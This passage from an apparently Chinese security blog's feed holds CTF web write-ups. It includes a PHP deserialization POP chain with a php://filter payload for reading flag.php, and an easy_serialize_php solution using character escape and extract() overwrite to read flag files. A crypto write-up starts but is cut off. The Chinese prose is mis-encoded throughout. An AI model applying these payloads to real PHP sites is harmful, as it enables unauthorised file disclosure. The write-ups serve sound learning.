    <published>2021-03-25T03:32:21.000Z</published>
    <updated>2021-03-27T11:39:11.946Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>è¿™ä¸ªé“¾å­æœ‰å¤Ÿé•¿çš„</p></blockquote><h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p>ä¸»è¦è€ƒå¯Ÿ:</p><ol><li>ååºåˆ—åŒ–é­”æœ¯æ–¹æ³•</li><li>æ–‡ä»¶åŒ…å«ä¼ªåè®®</li></ol><p>è¿™ä¸¤éƒ¨åˆ†å¯ä»¥æ‰¾ååºåˆ—åŒ–ç¬”è®°å’Œæ–‡ä»¶åŒ…å«ç¬”è®°</p><h1 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h1><p>ä»£ç ä¸é•¿ç›´æ¥è´´å‡ºæ¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>å¼€å¤´æç¤ºç»™äº†flagåœ¨<code>flag.php</code>ä¸­, æ‰€ä»¥è¦æƒ³åŠæ³•è¯»å–ä»–.<br>å¤§æ¦‚çœ‹äº†ä¸€é, å‘ç°ä¸ª<code>Modifier.append()</code>é‡Œé¢æœ‰ä¸ª<code>include()</code>, è¦æƒ³åŠæ³•è°ƒç”¨å®ƒ. è€Œåœ¨åŒä¸ªç±»ä¸­å®šä¹‰äº†é­”æœ¯æ–¹æ³•<code>__invoke()</code>ä¼šè°ƒç”¨<code>append()</code>. è¦æƒ³è°ƒç”¨<code>__invoke()</code>, å°±è¦æŠŠå¯¹è±¡å½“æˆæ˜¯å‡½æ•°è¿›è¡Œè°ƒç”¨. </p><p>åˆ†æåˆ°è¿™é‡Œå…ˆæ–­å¼€, å› ä¸ºæˆ‘ä»¬è¿˜ä¸çŸ¥é“åˆ°åº•æœ‰å•¥åŠæ³•å¼€å§‹å‡½æ•°é“¾çš„è°ƒç”¨.</p><p>ä»£ç é‡Œé¢åªæœ‰ä¸€è¡Œ<code>@unserialize($_GET[&#39;pop&#39;]);</code>, è¦æƒ³åœ¨ååºåˆ—åŒ–åè¿›è¡Œæ›´å¤šæ“ä½œ, ä¼°è®¡æ˜¯éœ€è¦ä¸€ä¸ª<code>__wakeup()</code>çš„, è€Œç±»<code>Show</code>æ˜¯å®šä¹‰äº†<code>__wakeup()</code>, è€Œè¿™ä¸ª<code>__wakeup()</code>ä¸­åªå­˜åœ¨ä¸€ä¸ªè°ƒç”¨<code>$this-&gt;source = &quot;index.php&quot;;</code>, è¿™æ˜¯ä¸€ä¸ªå¯¹å­—ç¬¦ä¸²çš„æ“ä½œ, å¯ä»¥é©¬ä¸Šæƒ³åˆ°<code>__toString()</code></p><p>è€Œç±»<code>Show</code>ä¸­åŒæ ·æœ‰<code>__toString()</code>, ç»§ç»­çœ‹ä¸‹å», <code>__toString()</code>é‡Œä¾ç„¶åªæœ‰ä¸€ä¸ªè°ƒç”¨<code>return $this-&gt;str-&gt;source;</code><br>è¿™é‡Œå¯ä»¥è°ƒç”¨ä¸€ä¸ªå˜é‡, è¦æƒ³åˆ°<code>__get()</code>, åˆšå¥½ç±»<code>Test</code>ä¸­æœ‰<code>__get()</code>, è€Œè¿™ä¸ª<code>__get()</code>å°±æä¾›äº†ä¸€ä¸ªå‡½æ•°è°ƒç”¨çš„å…¥å£.</p><p>åˆ°äº†è¿™é‡Œæˆ‘ä»¬å°±æ‰¾åˆ°äº†ä¸€ä¸ªè°ƒç”¨é“¾:</p><p><code>@unserialize($_GET[&#39;pop&#39;])</code> -&gt; <code>Show.__wakeup()</code> -&gt; <code>Show.__toString()</code> -&gt; <code>Test.__get()</code> -&gt; <code>Modifier.__invoke()</code> -&gt; <code>Modifier.appen()</code> -&gt; <code>include()</code></p><h1 id="payloadæ„é€ "><a href="#payloadæ„é€ " class="headerlink" title="payloadæ„é€ "></a>payloadæ„é€ </h1><p>æˆ‘ä»¬è·Ÿç€è°ƒç”¨é“¾ä¸€æ­¥ä¸€æ­¥æ„é€ å³å¯, è¿™é‡Œè¿˜éœ€è¦æ³¨æ„ä¸€ä¸‹, å› ä¸ºæ˜¯è¦åŒ…å«ä¸€ä¸ªphpæ–‡ä»¶, ç›´æ¥åŒ…å«ä¼šç›´æ¥æ‰§è¡Œ, é‚£ä¹ˆé‡Œé¢çš„å˜é‡å°±çœ‹ä¸åˆ°äº†, è¦ç”¨<code>php:\\filter</code>è®²æ–‡ä»¶base64ç¼–ç å†åŒ…å«è¿›æ¥. </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span> = <span class="string">&#x27;ftp&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> Test;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> Modifier;</span><br><span class="line"><span class="variable">$c</span>-&gt;p = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;str = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;source = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>å¾—åˆ°payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A59%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D.%2Fflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3Bs%3A3%3A%22ftp%22%3B%7D</span><br></pre></td></tr></table></figure><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>ç›´æ¥ä¼ å°±å®Œäº‹äº†. ä¼ å®Œæ‹¿åˆ°æ–‡ä»¶åbase64è§£ç ä¸€ä¸‹</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;è¿™ä¸ªé“¾å­æœ‰å¤Ÿé•¿çš„&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;æ¦‚è¿°&quot;&gt;&lt;/a&gt;æ¦‚è¿°&lt;/h1&gt;&lt;p&gt;ä¸»è¦è€ƒå¯Ÿ:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ååºåˆ—åŒ–é­”æœ¯æ–¹æ³•</summary>
      
    
    
    
    <category term="WebSummary" scheme="http://tearsjin.github.io/categories/WebSummary/"/>
    
    
    <category term="Web" scheme="http://tearsjin.github.io/tags/Web/"/>
    
    <category term="unserialize" scheme="http://tearsjin.github.io/tags/unserialize/"/>
    
    <category term="é­”æœ¯æ–¹æ³•" scheme="http://tearsjin.github.io/tags/%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"/>
    
    <category term="æ–‡ä»¶åŒ…å«" scheme="http://tearsjin.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    <category term="ä¼ªåè®®" scheme="http://tearsjin.github.io/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>Noting of [å®‰æ´µæ¯ 2019]easy_serialize_php</title>
    <link href="http://tearsjin.github.io/2021/03/24/Noting-of-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php/"/>
    <id>http://tearsjin.github.io/2021/03/24/Noting-of-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php/</id>
    <published>2021-03-24T15:59:59.000Z</published>
    <updated>2021-03-25T01:34:38.155Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>åˆæ˜¯ä¸€é¢˜å­—ç¬¦é€ƒé€¸, ä¸è¿‡è¿˜æœ‰å…¶ä»–è¦æ³¨æ„çš„ç‚¹</p></blockquote><h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p>è¿™é¢˜è€ƒå¯Ÿçš„ç‚¹æœ‰:</p><ol><li>ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</li><li><code>extract()</code>å˜é‡è¦†ç›–</li></ol><h1 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h1><p>æç¤ºè¯´<code>phpinfo()</code>ä¸­æœ‰ä¸œè¥¿, æ‰¾äº†ä¸€ä¸‹å‘ç°æœ‰<code>auto_append_file: d0g3_f1ag.php</code><br><code>auto_append_file</code>: è®¾ç½®æ¯ä¸ªphpä¸­éƒ½è‡ªåŠ¨requireä¸€ä¸ªæ–‡ä»¶</p><p>ä¸­é—´æœ‰ä¸ª<code>extract($_POST)</code>, å¯èƒ½å­˜åœ¨å˜é‡è¦†ç›–</p><p>åœ¨ä»£ç çš„æœ€å, å­˜åœ¨<code>file_get_contents(base64_decode($userinfo[&#39;img&#39;])) </code>çœ‹å‚æ•°æ˜¯å¦å¯æ§, å¯ä»¥çœ‹åˆ°æœ‰ä¸¤è¡Œ<br><code>$userinfo = unserialize($serialize_info) </code><br><code>$serialize_info = filter(serialize($_SESSION))</code></p><p>ç¡®è®¤æœ‰åºåˆ—åŒ–å’Œååºåˆ—åŒ–, è€Œ<code>$serialize_info</code>åœ¨åºåˆ—åŒ–ä¹‹åå­˜åœ¨ä¸€ä¸ªè¿‡æ»¤ä½¿å¾—å­—ç¬¦å‡å°‘ å¯èƒ½å­˜åœ¨å­—ç¬¦é€ƒé€¸<br>æ¥ç»†ç»†çœ‹ä¸€ä¸‹<code>$_SESSION</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;user&quot;</span> =&gt; <span class="string">&#x27;guest&#x27;</span>,</span><br><span class="line"><span class="string">&quot;function&quot;</span> =&gt; @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>],</span><br><span class="line"><span class="string">&quot;img&quot;</span> =&gt; sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])),</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªå‚æ•°æ˜¯å¯ä»¥æ§åˆ¶çš„, ä½†<code>&quot;img&quot;</code>ä¼šè¿›è¡Œä¸€æ¬¡<code>sha1</code>åŠ å¯†, ååºåˆ—åŒ–åå´ä¸è¿›è¡Œ<code>sha1</code>è§£å¯†, æ‰€ä»¥æ— è®ºè¾“å…¥ä»€ä¹ˆåŸºæœ¬éƒ½æ˜¯æ— æ•ˆçš„â€¦</p><p>è€Œ<code>&quot;function&quot;</code>æ˜¯å¯æ§, ä¸”å­˜åœ¨å­—ç¬¦é€ƒé€¸, ä½†å¦‚æœè¦æ‰§è¡Œ<code>file_get_contents()â€‹</code>, å¿…é¡»æœ‰<code>$function=&#39;show_image&#39;</code>, åœ¨<code>$function</code>çš„å€¼èµ‹ç»™<code>$_SESSION</code>ä¹‹å, å­˜åœ¨ä¸€ä¸ª<code>$extract($_POST)</code>, æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªä¿®æ”¹<code>$function</code> ä¸ºshow_image</p><p>åˆ°è¿™é‡Œæ€è·¯å°±æ¸…æ¥šäº†:</p><p><code>file_get_contents(base64_decode($userinfo[&#39;img&#39;]))</code>å‚æ•°å¯æ§ -&gt; åˆ©ç”¨å­—ç¬¦é€ƒé€¸ä»<code>&quot;funtion&quot;</code>æ§åˆ¶<code>&quot;img&quot;</code> -&gt; åˆ©ç”¨ <code>extract()</code>å˜é‡è¦†ç›–ä¿®æ”¹<code>$function</code>ä¸º<code>show_image</code></p><h1 id="ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"><a href="#ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸" class="headerlink" title="ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"></a>ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</h1><p>æ€»ç»“äº†æŒºå¤šæ¬¡äº†â€¦</p><p>è¿™æ¬¡çš„<code>filter</code>æ˜¯å­—ç¬¦å‡å°‘çš„æ›¿æ¢, éœ€è¦åˆ©ç”¨æ•°ç»„æ¥è¿›è¡Œé€ƒé€¸, å…·ä½“åŸç†ä¸å¤šè®²äº†, å¯ä»¥çœ‹ååºåˆ—åŒ–é‚£ç¯‡ç¬”è®°</p><h1 id="extract-å˜é‡è¦†ç›–"><a href="#extract-å˜é‡è¦†ç›–" class="headerlink" title="extract()å˜é‡è¦†ç›–"></a><code>extract()</code>å˜é‡è¦†ç›–</h1><p>è¿™ä¸ªè¿˜æ˜¯ç¬¬ä¸€æ¬¡é‡åˆ°,.</p><p><code>extract() </code>å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´å‚æ•°æ˜¯ä¸ªæ•°ç»„, å¹¶ä¸”æ ¹æ®é”®å¯¹å€¼æ¥åˆ›é€ å˜é‡, è€Œä¸”å¯ä»¥è¦†ç›–å‰é¢çš„å˜é‡, è¿™æ ·å°±å¯ä»¥é€ æˆå˜é‡è¦†ç›–äº†</p><h1 id="payload-æ„é€ "><a href="#payload-æ„é€ " class="headerlink" title="payload æ„é€ "></a>payload æ„é€ </h1><blockquote><p>å­—ç¬¦é€ƒé€¸çš„æ„é€ ä¹Ÿæ€»ç»“å¾ˆå¤šæ¬¡äº†, è¿™æ¬¡å°±ç®€å•çš„è¯´ä¸€ä¸‹</p></blockquote><p>è¿™é¢˜ä¸»è¦å°±æ˜¯æ„é€ å­—ç¬¦é€ƒé€¸çš„payload, æˆ‘ä»¬éœ€è¦æœ€å<code>&quot;img&quot; =&gt; base64encode(&quot;d0g3_f1ag.php&quot;)</code><br>è€å¥—è·¯, å…ˆæ„é€ ä¸€ä¸ª</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="comment"># a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;N;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>å†æ…¢æ…¢å°è¯•é€šè¿‡å­—ç¬¦å‡å°‘æŠŠä¸€ä¸ªåŒå¼•å·é—­åˆ, æœ€åå¯ä»¥æ„é€ å‡ºpayload: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f[]&#x3D;phpphpphpphp&amp;f[]&#x3D;&quot;;i:1;s:1:&quot;1&quot;;&#125;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mbGxsbGxsYWc&#x3D;</span><br></pre></td></tr></table></figure><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><p><code>GET</code>æ–¹å¼ä¼ <code>?f[]=phpphpphpphp&amp;f[]=&quot;;i:1;s:1:&quot;1&quot;;&#125;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mbGxsbGxsYWc=</code><br><code>POST</code>æ–¹å¼ä¼ <code>function=show_image</code></p><p>ä¸è¿‡ç»“æœå‘ç°flagå¹¶ä¸åœ¨<code>d0g3_f1ag.php</code>ä¸­,<code>d0g3_f1ag.php</code>ä¸­åªæœ‰ä¸€å¥ <code>$flag = &#39;flag in /d0g3_fllllllag&#39;;</code><br>é‚£å°±å†æ„é€ ä¸€æ¬¡</p><p><code>?f[]=phpphpphpphp&amp;f[]=&quot;;i:1;s:1:&quot;1&quot;;&#125;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn</code></p><p>åˆ«å¿˜äº†<code>POST</code>, ç„¶åå°±èƒ½çœ‹åˆ°flagäº†</p><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>åšå®Œé¢˜åç¿»äº†ä¸‹åˆ«çš„å¸ˆå‚…çš„wp, å‘ç°åˆ«çš„å¸ˆå‚…éƒ½æ˜¯<code>GET</code>ä¼ <code>f=show_image</code>, <code>POST</code>ç›´æ¥å¯¹<code>$_SESSION[&#39;user&#39;]</code>å’Œ<code>$_SESSION[&#39;function&#39;]</code>åšæ–‡ç« , è¿™æ ·å°±ä¸éœ€è¦é€šè¿‡æ•°ç»„æ¥è¿›è¡Œå­—ç¬¦é€ƒé€¸äº†, è¿™ä¹Ÿæ˜¯ä¸€ç§æ€è·¯, è€Œä¸”å¯ä»¥æ§åˆ¶çš„å˜é‡æ›´å¤šäº†(æˆ‘è„‘å­æ€ä¹ˆå°±æ²¡è½¬è¿‡æ¥â€¦</p><p>ä¸è¿‡å› ä¸ºè„‘å­æ²¡è½¬è¿‡æ¥ä¹Ÿè§£é”äº†æ§åˆ¶ä¸€ä¸ªå˜é‡çš„æ—¶å€™, åˆ©ç”¨æ•°å­—æ¥è¿›è¡Œå­—ç¬¦å‡å°‘çš„å­—ç¬¦é€ƒé€¸!</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;åˆæ˜¯ä¸€é¢˜å­—ç¬¦é€ƒé€¸, ä¸è¿‡è¿˜æœ‰å…¶ä»–è¦æ³¨æ„çš„ç‚¹&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;æ¦‚è¿°&quot;&gt;&lt;/a&gt;æ¦‚è¿°&lt;/h1&gt;&lt;p&gt;è¿™é¢˜è€ƒå¯Ÿçš„ç‚¹æœ‰:&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="WebSummary" scheme="http://tearsjin.github.io/categories/WebSummary/"/>
    
    
    <category term="Web" scheme="http://tearsjin.github.io/tags/Web/"/>
    
    <category term="å­—ç¬¦é€ƒé€¸" scheme="http://tearsjin.github.io/tags/%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/"/>
    
    <category term="unserialize" scheme="http://tearsjin.github.io/tags/unserialize/"/>
    
    <category term="å˜é‡è¦†ç›–" scheme="http://tearsjin.github.io/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"/>
    
  </entry>
  
  <entry>
    <title>writeup for 2021 NepCTF(To be continued</title>
    <link href="http://tearsjin.github.io/2021/03/24/writeup-for-2021-NepCTF/"/>
    <id>http://tearsjin.github.io/2021/03/24/writeup-for-2021-NepCTF/</id>
    <published>2021-03-24T07:59:39.000Z</published>
    <updated>2021-04-06T10:01:08.545Z</updated>
    
    <content type="html"><![CDATA[<p>å¤ªèœäº†å¤ªèœäº†å¤ªèœäº†, è™½ç„¶è¯´è·‘å‡ºå»ç©äº†ä¸¤å¤©, ä½†è¿˜æ˜¯èŠ±äº†åŠå¤©æ—¶é—´åšçš„, ä¸€é“Coppersmithâ€™s short-pad attackæ²¡æœ‰æƒ³åˆ°è°ƒ$\beta$, åšäº†åŠå¤©éƒ½æ²¡å‡ºæ¥, å±å®æ‹‰äº†. æœ€åä¹Ÿå°±åšäº†ä¸ªæ”¹è¡¨çš„base64â€¦.ç®—æ˜¯é™¤äº†ç­¾åˆ°å°±æ²¡å‡ºå§(è¿˜æœ‰é“å¤å…¸ä¸æƒ³æŸ¥äº†5555</p><h1 id="0x00-Real-Base"><a href="#0x00-Real-Base" class="headerlink" title="0x00 Real_Base"></a>0x00 Real_Base</h1><h2 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#py2</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,b_char</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">s</span>):</span></span><br><span class="line">    res=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    binstr=[ <span class="built_in">bin</span>(<span class="built_in">ord</span>(s[i])).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s))]</span><br><span class="line">    p1=<span class="built_in">len</span>(binstr) // <span class="number">3</span></span><br><span class="line">    p2=<span class="built_in">len</span>(binstr) % <span class="number">3</span></span><br><span class="line">    part1 = binstr[<span class="number">0</span>:<span class="number">3</span>*p1]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(p1):</span><br><span class="line">        str_p1=binstr[i*<span class="number">3</span>]+binstr[i*<span class="number">3</span>+<span class="number">1</span>]+binstr[i*<span class="number">3</span>+<span class="number">2</span>]</span><br><span class="line">        tmp_str = [str_p1[x: x + <span class="number">6</span>] <span 